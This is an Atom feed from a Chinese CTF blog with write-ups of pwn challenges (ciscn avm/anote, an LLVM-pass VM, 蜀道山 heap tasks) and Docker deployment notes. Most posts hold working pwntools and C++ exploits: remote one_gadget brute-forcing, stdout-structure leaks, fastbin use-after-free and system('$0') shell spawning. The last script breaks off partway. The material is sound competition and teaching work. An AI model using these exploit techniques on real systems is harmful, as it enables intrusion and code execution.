<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://l1u66.github.io/</id>
    <title>L1u66&apos;s blog</title>
    <updated>2024-12-17T15:31:18.282Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://l1u66.github.io/"/>
    <link rel="self" href="https://l1u66.github.io/atom.xml"/>
    <subtitle>世间万般兵刃，唯有过往伤人最深</subtitle>
    <logo>https://l1u66.github.io/images/avatar.png</logo>
    <icon>https://l1u66.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, L1u66&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[ciscn暨长城杯]]></title>
        <id>https://l1u66.github.io/post/ciscn-ji-chang-cheng-bei/</id>
        <link href="https://l1u66.github.io/post/ciscn-ji-chang-cheng-bei/">
        </link>
        <updated>2024-12-15T14:39:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="avm">avm</h1>
<p>vm实现了+、-、*、/、^、&amp;、左移、右移、将栈上的地址写一个到bss上的qword_40C0上、将qword_40C0写一个到栈上的地址，挨个进行逆向分析参数和指令识别码</p>
<h2 id="vm运行">vm运行</h2>
<p><img src="https://l1u66.github.io//post-images/1734274709780.png" alt="" loading="lazy"><br>
其中a1是qword_40C0，其中a1[32]是当前指令位置，a1[33]是opcode首地址，a1[34]是opcode最大字节数即0x300<br>
<img src="https://l1u66.github.io//post-images/1734274843890.png" alt="" loading="lazy"><br>
和-4按位与后只能是4的倍数，以四个字节取出opcode后又右移了28位作为了识别指令的标识，假如四个字节为<code>\x12\x34\x56\x78</code>那么也就是0x78563412，右移28位也就是7，所以就此得知如何控制程序执行的函数</p>
<h2 id="加">加</h2>
<p><img src="https://l1u66.github.io//post-images/1734274357809.png" alt="" loading="lazy"><br>
后面就是动静结合看下opcode的使用</p>
<pre><code>  v2 = *(_DWORD *)(*(_QWORD *)(a1 + 0x108) + (*(_QWORD *)(a1 + 0x100) &amp; 0xFFFFFFFFFFFFFFFCLL));
  *(_QWORD *)(a1 + 0x100) += 4LL;
</code></pre>
<p>这两行用作取出当前的opcode，再指向下一个opcode<br>
<code>(a1 + 8LL * (v2 &amp; 0x1F)</code>qword_40C0的下标是由第一个字节也就是\x12决定的，\x12是写到qword_40C0下标为12的地方，如果是\x22那么下标就是2，由于是和0x1f按位与，所以下标前面有没有1取决于第一个字节也就是\x12高4位是否为奇数<br>
<code>(a1 + 8LL * (HIWORD(v2) &amp; 0x1F))</code>第一个操作数。HIWORD可以当做是吧opcode向右移两个字节，也就是\x56，再和0x1f按位与，那么下标就是16的位置<br>
<code>(a1 + 8LL * ((v2 &gt;&gt; 5) &amp; 0x1F))</code>第二个操作数。有个v2 &gt;&gt; 5就和前两个字节有关了，具体可以用计算器，假如如果想用7做下标，那么让7左移5位得到0xe0，那么就需要控制前两个字节为\xe?\x00或者\xf?\x00，这里0xe是偶数，所以第一个操作数下标就是?，0xf是奇数，所以第一个操作数下标是1?</p>
<h2 id="前八个操作数">前八个操作数</h2>
<p>前八个操作数都类似，和加法类比即可</p>
<h2 id="第九个第十个操作数-以及利用方式">第九个第十个操作数 以及利用方式</h2>
<p><img src="https://l1u66.github.io//post-images/1734276255383.png" alt="" loading="lazy"><br>
动态调试发现此处a2是栈上的地址，该功能是把qword_40C0上的数据写到栈上指定的位置<br>
<img src="https://l1u66.github.io//post-images/1734276379794.png" alt="" loading="lazy"><br>
该功能是把栈上指定的位置的数据写到qword_40C0上<br>
程序本身并没有什么可以泄露地址的地方，所以就利用方法就可以猜出，先把栈上的libc相关地址写到qword_40C0上，然后再通过加减乘除左移右移等方式把该地址改成og，然后再把栈上的返回地址修改成og即可，但是经过栈上查找，发现没有离og较近的地址，所以理论上就需要爆破一个半字节，也就是16<em>16</em>16分之一的概率，但是实际上很好爆（（（，后面主要就是构造og的过程了，由于犯了一些逆天操作，导致比赛没出来😭😭😭😭😭😭，整个抑郁住了</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# elf=ELF('./pwn')
# libc=elf.libc
# # p = remote('39.105.55.245', 24653)
# p=process('./pwn')

# #        cebd3f
# payload = b'\x11\x22\xb8\xa6'  #传入libc地址
# payload += b'\x10\x22\xc0\xa4'  #传入1
# payload += b'\xa5\x20\x10\x14'  #传入1
# payload += b'\x13\x22\x10\x14'  #相加得出右移位数24
# payload += b'\x12\x22\x13\x14' #留奇数
# payload += b'\x13\x22\x13\x14'*22  #10 + 13 -&gt;13
# payload += b'\x10\x22\x11\x14'
# payload += b'\x11\x22\x13\x80' #右移
# payload += b'\x20\x22\x13\x70' #左移 11处
# payload += b'\x63\x22\x13\x34'  #相×得出padding
# payload += b'\x63\x22\x13\x34'  #相×得出padding
# payload += b'\x62\x20\x13\x34'  #相×得出padding
# payload += b'\x43\x20\x12\x34'  #相x得出padding
# payload += b'\x63\x20\x12\x34'  #相×得出padding
# payload += b'\x64\x00\x12\x30'  #相×得出padding
# payload += b'\x86\x00\x12\x30'  #相×得出padding
# payload += b'\xc7\x00\x12\x30'  #相×得出padding
# payload += b'\xe8\x00\x12\x30'  #相×得出padding
# payload += b'\x09\x01\x06\x10'  #相+得出padding
# payload += b'\x2a\x01\x03\x10'*2  #相+得出padding
# payload += b'\x48\x01\x02\x10'  #相+得出padding
# payload += b'\x09\x01\x02\x10'  #相+得出padding
# payload += b'\x2a\x01\x02\x10'  #相+得出padding
# payload += b'\x4a\x01\x02\x10'*7  #相+得出padding
# payload += b'\x41\x02\x13\x30'  #相×得出padding
# payload += b'\x4a\x01\x01\x20'*0x75  #相-得出padding
# payload += b'\x4a\x01\x13\x10'  #相+得出padding
# payload += b'\x4a\x01\x12\x10'*5  #相+得出padding
# payload += b'\xa7\x00\x05\x10'  #相+得出padding
# payload += b'\xeb\x00\x13\x70' #左移
# payload += b'\x6b\x01\x05\x80' #右移
# payload += b'\x6b\x01\x12\x80' #右移
# payload += b'\x4a\x01\x0b\x10'  #相+得出padding
# payload += b'\x51\x01\x00\x10'  #相+得出padding
# payload += b'\xd1\x22\x18\x91' # 11是堆块中的下标 \x18\x91 位置在栈上118也就是需要修改的返回地址
# gdb.attach(p,'b *$rebase(0x00000000000175D)')
# p.sendafter(&quot;opcode: &quot;,payload)
# p.sendafter('Unsupported instruction','cat flag')
# p.sendline('cat flag')

# p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

rnd = 0
while True:
    try:
        p = remote('39.105.55.245', 24653)
        # p=process('./pwn')
        rnd += 1
        li('the ' + str(rnd) + ' round')
        
        payload = b'\x11\x22\xb8\xa6'  #传入libc地址
        payload += b'\x10\x22\xc0\xa4'  #传入1
        payload += b'\xa5\x20\x10\x14'  #传入1
        payload += b'\x13\x22\x10\x14'  #相加得出右移位数24
        payload += b'\x12\x22\x13\x14' #留奇数
        payload += b'\x13\x22\x13\x14'*22  #10 + 13 -&gt;13
        payload += b'\x10\x22\x11\x14'
        payload += b'\x11\x22\x13\x80' #右移
        payload += b'\x20\x22\x13\x70' #左移 11处
        payload += b'\x63\x22\x13\x34'  #相×得出padding
        payload += b'\x63\x22\x13\x34'  #相×得出padding
        payload += b'\x62\x20\x13\x34'  #相×得出padding
        payload += b'\x43\x20\x12\x34'  #相x得出padding
        payload += b'\x63\x20\x12\x34'  #相×得出padding
        payload += b'\x64\x00\x12\x30'  #相×得出padding
        payload += b'\x86\x00\x12\x30'  #相×得出padding
        payload += b'\xc7\x00\x12\x30'  #相×得出padding
        payload += b'\xe8\x00\x12\x30'  #相×得出padding
        payload += b'\x09\x01\x06\x10'  #相+得出padding
        payload += b'\x2a\x01\x03\x10'*2  #相+得出padding
        payload += b'\x48\x01\x02\x10'  #相+得出padding
        payload += b'\x09\x01\x02\x10'  #相+得出padding
        payload += b'\x2a\x01\x02\x10'  #相+得出padding
        payload += b'\x4a\x01\x02\x10'*7  #相+得出padding
        payload += b'\x41\x02\x13\x30'  #相×得出padding
        payload += b'\x4a\x01\x01\x20'*0x75  #相-得出padding
        payload += b'\x4a\x01\x13\x10'  #相+得出padding
        payload += b'\x4a\x01\x12\x10'*5  #相+得出padding
        payload += b'\xa7\x00\x05\x10'  #相+得出padding
        payload += b'\xeb\x00\x13\x70' #左移
        payload += b'\x6b\x01\x05\x80' #右移
        payload += b'\x6b\x01\x12\x80' #右移
        payload += b'\x4a\x01\x0b\x10'  #相+得出padding
        payload += b'\x51\x01\x00\x10'  #相+得出padding
        payload += b'\xd1\x22\x18\x91' # 11是堆块中的下标 \x18\x91 位置在栈上118也就是需要修改的返回地址
        p.sendafter(&quot;opcode: &quot;,payload)
        # p.sendafter('Unsupported instruction','cat flag')
        p.interactive()

    except EOFError:
        p.close()
        continue
</code></pre>
<h1 id="anote">anote</h1>
<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1734277338936.png" alt="" loading="lazy"></figure>
<p>发现<code>(**(void (__cdecl ***)(_DWORD))*(&amp;v25 + v20))(*(&amp;v25 + v20));</code></p>
<p>show功能给出了堆块地址<br>
<img src="https://l1u66.github.io//post-images/1734277332950.png" alt="" loading="lazy"></p>
<p>发现每次edit之后都会call这个地址指向的地址</p>
<p>动态调试后发现在edit前一个堆块时可以修改当前堆块的该地址</p>
<p>事先在堆块里写入后门地址，然后在这个地址写入存放后门地址的堆块地址即可调用后门函数</p>
<pre><code>from pwn import *
context(arch='i386', os='linux', log_level='debug')
elf=ELF('./note')
libc=elf.libc
#io=remote('47.94.216.142',32962)
io=process('./note')
 
def cmd(choice):
    io.recvuntil(b&quot;Choice&gt;&gt;&quot;)
    io.sendline(str(choice).encode())
 
def add() :
    cmd(1)
 
def show(idx):
    cmd(2)
    io.recvuntil(b&quot;index: &quot;)
    io.sendline(str(idx).encode())
 
def edit(idx,size,content='a') :
    cmd(3)
    io.recvuntil(b&quot;index: &quot;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&quot;len: &quot;)
    io.sendline(str(size).encode())
    io.recvuntil(b&quot;content: &quot;)
    io.sendline(content)


backdoor = 0x80489CE
add()
add()
show(0)
io.recvuntil(&quot;0x&quot;)
sys = int(io.recv(7),16)
gdb.attach(io)
edit(0,40,b'a'*20 + p32(backdoor) + p32(sys + 0x1c))
print(&quot;sys = &quot;,hex(sys))

edit(1,40,b'a'*24)

io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[LLVM-pwn]]></title>
        <id>https://l1u66.github.io/post/llvm-pwn/</id>
        <link href="https://l1u66.github.io/post/llvm-pwn/">
        </link>
        <updated>2024-12-10T14:55:35.000Z</updated>
        <content type="html"><![CDATA[<p><a href="https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1">https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1</a></p>
<h1 id="环境配置">环境配置</h1>
<p><code>sudo apt install clang-12 clang-8 llvm-12 llvm-8</code></p>
<h1 id="编译">编译</h1>
<p><code>clang-12 -emit-llvm -S exp.cpp -o exp.ll</code></p>
<h1 id="运行">运行</h1>
<p><code>opt-12 -load ./xxx.so -标识符 ./exp.ll</code></p>
<h1 id="c函数名修饰规则">c++函数名修饰规则</h1>
<p>使用gcc或clang编译c++时会经过名称修饰的过程从而改变函数名，修饰后的名称通常包括：<br>
_Z：修饰名称的开始</p>
<p>N：表示这是一个函数或静态成员函数</p>
<p>数字：表示函数名称的长度</p>
<p>类名和函数名：经过编码的类名和函数名</p>
<p>E：参数列表的开始</p>
<p>参数类型：通过不同的字母按顺序表示参数类型</p>
<table>
<thead>
<tr>
<th style="text-align:center">字母</th>
<th style="text-align:center">参数类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">i</td>
<td style="text-align:center">int</td>
</tr>
<tr>
<td style="text-align:center">j</td>
<td style="text-align:center">unsigned int</td>
</tr>
<tr>
<td style="text-align:center">l</td>
<td style="text-align:center">long</td>
</tr>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">long long</td>
</tr>
<tr>
<td style="text-align:center">m</td>
<td style="text-align:center">unsigned long</td>
</tr>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">char</td>
</tr>
<tr>
<td style="text-align:center">h</td>
<td style="text-align:center">unsigned char</td>
</tr>
<tr>
<td style="text-align:center">b</td>
<td style="text-align:center">bool</td>
</tr>
<tr>
<td style="text-align:center">结尾：包含额外信息如返回类型</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>例如_ZN4edoc4addiEhii表示在edoc类中的函数名长度为4的函数addi，它的三个参数分别是unsigned char、int、int类型</p>
<h1 id="解题">解题</h1>
<p><img src="https://l1u66.github.io//post-images/1733843158994.png" alt="" loading="lazy"><br>
题目给出了codeVM.so和opt-12以及ld-linux-x86-64.so.2和libc.so.6，需要逆向分析的是code.so文件，动态调试时用的是opt-12</p>
<h1 id="动态调试">动态调试</h1>
<p>使用<code>gdb opt-12</code>进行调试，并且通过<code>set args -load ./codeVM.so -Co00o0oOd3 ./exp.ll -f</code>导入参数，在<code>main</code>函数下断点，运行至所有llvm::initialize前缀的初始化函数结束，也就是这里<br>
<img src="https://l1u66.github.io//post-images/1733843559366.png" alt="" loading="lazy"><br>
使用<code>vmmap</code>获取xxx.so的基址，通过IDA中的偏移下断点进行进一步调试（如果没有基址说明初始胡函数还没运行完<br>
其中Co00o0oOd3是在_cxx_global_var_init_17函数中<br>
<img src="https://l1u66.github.io//post-images/1733843473097.png" alt="" loading="lazy"><br>
在<code>_data_rel_ro</code>段可以找到程序入口<br>
<img src="https://l1u66.github.io//post-images/1733843735739.png" alt="" loading="lazy"><br>
<img src="https://l1u66.github.io//post-images/1733843758487.png" alt="" loading="lazy"><br>
易推断出<br>
<code>llvm::Value::getName();</code>用于获取函数名<br>
<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>用于比较函数名<br>
所以可以通过在<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>处下断点来找出程序函数名<br>
<img src="https://l1u66.github.io//post-images/1733843967112.png" alt="" loading="lazy"><br>
这里获得codeVM.so的基址，然后加上<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>在codeVM.so中的偏移即可<br>
<img src="https://l1u66.github.io//post-images/1733844073046.png" alt="" loading="lazy"><br>
这里的测试函数是testfunction经过函数名修饰成为_Z12testfunctionv，可以看出程序入口函数需要被修饰为_Z10c0deVmMainv所以得到，程序入口函数名应该是c0deVmMain</p>
<p>进入vmrun函数</p>
<pre><code>__int64 __fastcall `anonymous namespace'::c0oo0o0Ode::vmRun(
        _anonymous_namespace_::c0oo0o0Ode *this,
        llvm::Function *a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  llvm::BasicBlock *v4; // rax
  llvm::BasicBlock *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // [rsp+10h] [rbp-40h] BYREF
  __int64 v15; // [rsp+18h] [rbp-38h] BYREF
  __int64 v16; // [rsp+20h] [rbp-30h] BYREF
  char v17[8]; // [rsp+28h] [rbp-28h] BYREF
  __int64 v18; // [rsp+30h] [rbp-20h] BYREF
  char v19[8]; // [rsp+38h] [rbp-18h] BYREF
  llvm::Function *v20; // [rsp+40h] [rbp-10h]
  _anonymous_namespace_::c0oo0o0Ode *v21; // [rsp+48h] [rbp-8h]

  v21 = this;
  v20 = a2;
  v2 = llvm::errs(this);
  llvm::raw_ostream::operator&lt;&lt;(v2, &quot;Talk is cheap. Show me the code!\n&quot;);
  v18 = llvm::Function::end(a2);
  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::ilist_iterator&lt;false&gt;(
    v19,
    &amp;v18,
    0LL);
  v16 = llvm::Function::begin(v20);
  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::ilist_iterator&lt;false&gt;(
    v17,
    &amp;v16,
    0LL);
  while ( 1 )
  {
    result = llvm::operator!=(v17, v19);
    if ( (result &amp; 1) == 0 )
      break;
    v4 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator-&gt;(v17);
    v15 = llvm::BasicBlock::begin(v4);
    v5 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator-&gt;(v17);
    v14 = llvm::BasicBlock::end(v5);
    while ( (llvm::operator!=(&amp;v15, &amp;v14) &amp; 1) != 0 )
    {
      v6 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 0LL);
      if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v6) &amp; 1) != 0 )
      {
        `anonymous namespace'::c0oo0o0Ode::op1(this, &amp;v15);
      }
      else
      {
        v7 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 1LL);
        if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v7) &amp; 1) != 0 )
        {
          `anonymous namespace'::c0oo0o0Ode::op2(this, &amp;v15);
        }
        else
        {
          v8 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 2LL);
          if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v8) &amp; 1) != 0 )
          {
            `anonymous namespace'::c0oo0o0Ode::op3(this, &amp;v15);
          }
          else
          {
            v9 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 3LL);
            if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v9) &amp; 1) != 0 )
            {
              `anonymous namespace'::c0oo0o0Ode::op4(this, &amp;v15);
            }
            else
            {
              v10 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 4LL);
              if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v10) &amp; 1) != 0 )
              {
                `anonymous namespace'::c0oo0o0Ode::op5(this, &amp;v15);
              }
              else
              {
                v11 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 5LL);
                if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v11) &amp; 1) != 0 )
                {
                  `anonymous namespace'::c0oo0o0Ode::op6(this, &amp;v15);
                }
                else
                {
                  v12 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 6LL);
                  if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v12) &amp; 1) != 0 )
                  {
                    `anonymous namespace'::c0oo0o0Ode::op7(this, &amp;v15);
                  }
                  else
                  {
                    v13 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 7LL);
                    if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v13) &amp; 1) != 0 )
                      `anonymous namespace'::c0oo0o0Ode::op8(this, &amp;v15);
                  }
                }
              }
            }
          }
        }
      }
      llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator++(&amp;v15);
    }
    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator++(v17);
  }
  return result;
}
</code></pre>
<p>可以看出是op1-8的指令，前面使用了<code>isValidOp</code>函数来判断<br>
进入后发现该函数内部也是通过<code>getName</code>读取函数名<code>operator==</code>比较函数名来实现的，所以可以用相同方法找出op1-8所用到的函数名<br>
这里以op1为例<br>
<img src="https://l1u66.github.io//post-images/1733844522717.png" alt="" loading="lazy"><br>
发现需要被修饰为<code>_ZN4edoc4addiEhii</code>(具体解释见C++函数名修饰规则)，可以推断出该函数是位于edoc类下的addi函数，参数类型是unsigned char、int、int，替他op同理得到交互代码</p>
<pre><code>class edoc {
public:
    void addi(unsigned char x, int y, int z) {}  
    void chgr(unsigned char x, int y) {}                  
    void sftr(unsigned char x, bool y, unsigned char z) {}       
    void borr(unsigned char x, unsigned char y, unsigned char z) {} 
    void movr(unsigned char x, unsigned char y) {}                 
    void save(unsigned char x, unsigned int  y) {}              
    void load(unsigned char x, unsigned int y) {}              
    void runc(unsigned char x, unsigned int  y) {}                
};

edoc obj;

int c0deVmMain() {
        return 0;
}
</code></pre>
<h1 id="逆向各个opcode">逆向各个opcode</h1>
<p>以op1为例<br>
<img src="https://l1u66.github.io//post-images/1733844761080.png" alt="" loading="lazy"><br>
<code>llvm::CallBase::getNumArgOperands(v13)</code>用于获取参数个数<br>
<code>ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);</code>类似创建参数对象<br>
<code>llvm::ConstantInt::getZExtValue(v8);</code>获取参数的值<br>
<code>*(_QWORD *)std::vector&lt;unsigned long&gt;::operator[](&amp;secret::regs, ZExtValue) = v6;</code>相当于regs[ZExtValue]=v6</p>
<h2 id="参数位置">参数位置</h2>
<p>主要关注<code>getZExtValue</code>和<code>getBoolValue</code>之类获取参数的函数<br>
还原各个op功能如下</p>
<pre><code class="language-c++">class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&gt; regs[reg] if |op| &lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &lt;&lt; bits if is_left else regs[reg] &gt;&gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 }
</code></pre>
<p>exp:</p>
<pre><code class="language-c++">class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&gt; regs[reg] if |op| &lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &lt;&lt; bits if is_left else regs[reg] &gt;&gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 };

edoc obj;

void testfunction(){}

int c0deVmMain() {
        obj.addi(0, 0x442000, 0);
        obj.movr(6, 0);
        obj.addi(1, 0x443000, 0);		
        obj.movr(7, 1);					//regs[7] = regs[6] + 0x1000
        obj.load(2, 0xad8);    			//load(0x4420xad8): regs[2] = getenv_addr

        obj.sftr(2, 0, 16);                     
        obj.sftr(2, 1, 12);
        obj.addi(5, 0x400, 0);
        obj.borr(2, 2, 5);
        obj.chgr(2, 0xc00);
        obj.sftr(2, 1, 4);				//Sets the lower two bytes to null and increments the third last byte by 1
        obj.addi(4, 0xd70, 0);
        obj.borr(2, 2, 4);				//clear and add
    
        obj.addi(4, 0x3024, 0);
        obj.save(4, 0x1000);			//save $0

        obj.save(2, 0xb00);				//save system

        obj.runc(1, 0xb00);				//system('$0')
        return 0;
}
</code></pre>
<p>爆破脚本</p>
<pre><code class="language-python">from pwn import *
import base64

context(arch='amd64', os='linux', log_level='debug')

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

context.terminal = ['tmux','splitw','-h']

with open(&quot;exp.ll&quot;, &quot;rb&quot;) as file:
    p = base64.b64encode(file.read())
p += b'\nEOF\n'

rnd = 0
while True:
    try:
        r = remote('127.0.0.1', 7090)
        rnd += 1
        li('the ' + str(rnd) + ' round')
        r.recvuntil(b'(EOF to stop):\n')

        r.send(p)

        r.sendline('cat flag')
        for i in range(4):
            s = r.recvline()
        if b'flag' in s:
            li(s)
            break
        else:
            continue

    except EOFError:
        r.close()
        continue
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[基于xinetd的pwn题目部署]]></title>
        <id>https://l1u66.github.io/post/ji-yu-xinetd-de-pwn-ti-mu-bu-shu/</id>
        <link href="https://l1u66.github.io/post/ji-yu-xinetd-de-pwn-ti-mu-bu-shu/">
        </link>
        <updated>2024-12-10T10:18:51.000Z</updated>
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/Myon5/article/details/131763593">https://blog.csdn.net/Myon5/article/details/131763593</a><br>
1.修改ctf.xinetd和Dockerfile的port为80<br>
2.搭建镜像<code>docker build -t &quot;镜像名&quot; .</code><br>
3.运行镜像<code>docker run -d -p &quot;0.0.0.0:8090:80&quot; -h &quot;镜像名&quot; --name=&quot;镜像名&quot; 镜像名</code><br>
4.直接<code>nc 127.0.0.1 8090</code>即可连接成功<br>
<code>docker cp flag 容器ID:/home/ctf</code>可替换flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[蜀道山]]></title>
        <id>https://l1u66.github.io/post/shu-dao-shan/</id>
        <link href="https://l1u66.github.io/post/shu-dao-shan/">
        </link>
        <updated>2024-11-18T10:20:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="第一道">第一道</h1>
<p><img src="https://l1u66.github.io//post-images/1731925415445.png" alt="" loading="lazy"><br>
发现只要知道libc地址然后再预测一下伪随机数即可拿到sell，question_list在bss段上，数组下表溢出即可改写stdout结构体，泄露出来libc地址，然后再随便预测一下伪随机数</p>
<pre><code>from pwn import *
from LibcSearcher import *
import ctypes
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
# 加载动态链接库
lib = ctypes.CDLL('./1.so')
lib.random_number.restype = ctypes.c_int
# 调用C语言的set_seed函数
lib.set_seed()
# 调用C语言的random_number函数
result = lib.random_number()
rand = result % 9011
print(rand)

#p = process(&quot;./pwn&quot;)
p = remote('gamebox.yunyansec.com',25683)

p.sendlineafter(&quot;Which question do you want to answer?\n&quot;,b'-8')

payload = p64(0xfbad1800) + p64(0)*3 + b'\x00'
p.sendlineafter(&quot;Then you can input your answer.&quot;,payload)
p.recv(1)
p.recv(8)
libc = u64(p.recv(8)) - 2017664
print(&quot;libc = &quot;,hex(libc))
puts = libc + 0x000000000084420
pause()
p.sendlineafter(&quot;Which question do you want to answer?&quot;,b'2')
p.sendlineafter(&quot;Then you can input your answer.&quot;,b'2')
p.sendlineafter(&quot;Which question do you want to answer?&quot;,b'3')
p.sendlineafter(&quot;Then you can input your answer.&quot;,p64(puts + rand))
p.interactive()
</code></pre>
<h1 id="第二道noleak">第二道(noleak??)</h1>
<p>2.23的libc,给了后门函数，程序开头给了堆地址，只有add和delete功能但是基本没有限制，存在uaf，版本很低，直接打fast attack即可，但是没有show功能，所以需要劫持stdout结构体，要让libc的地址出现在fast bin中，具体做法是先创建一个大的unsorted bin，然后通过uaf实现堆覆盖，大概布置成这个样子<br>
<img src="https://l1u66.github.io//post-images/1731926053038.png" alt="" loading="lazy"><br>
然后分配unsortedbin就可以，再修改低位覆盖即可</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./vuln')
e = ELF('./vuln')
libc = ELF('./libc.so.6')  # ubuntu22打本地

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b'&gt;&gt;&gt; ')
    r.sendline(str(choice).encode())


def add(idx,size,content):
    cmd(1)
    r.recvuntil(b'idx???')
    r.sendline(str(idx).encode())
    r.recvuntil(b'size???')
    r.sendline(str(size).encode())
    r.recvuntil(b'content???')
    r.send(content)


def delete(idx):
    cmd(2)
    r.recvuntil(b'idx???')
    r.sendline(str(idx).encode())

r.recvuntil(&quot;0x&quot;)
heap = int(r.recv(7),16)
print(&quot;heap = &quot;,hex(heap))
add(0,0x500,b'a')
add(1,0x20,b'a')
delete(0)
add(2,0x48,b'\x78')
add(3,0x48,(p64(0) + p64(0x51))*4)
add(4,0x78,b'\x78')
add(5,0x68,b'\x78')
add(10,0x48,b'\x78')
delete(2)
delete(3)
delete(2)
fake_heap = heap - 134992
add(6,0x48,p64(fake_heap))
add(7,0x48,b'a')
add(8,0x48,b'a')
add(9,0x48,p64(0) + p64(0xf1))
delete(4)
delete(5)
add(11,0x78,(p64(0) + p64(0x41))*7)
add(12,0x58,b'a')

add(4,0x38,b'\x78')
add(5,0x38,b'\x78')
add(10,0x38,b'\x78')
delete(4)
delete(5)
delete(4)
fake_heap = heap - 134864
add(6,0x38,p64(fake_heap))
add(99,0x38,b'a')
add(99,0x38,b'a')
add(9,0x38,p64(0) + p64(0x71) + b'\xdd\x55')
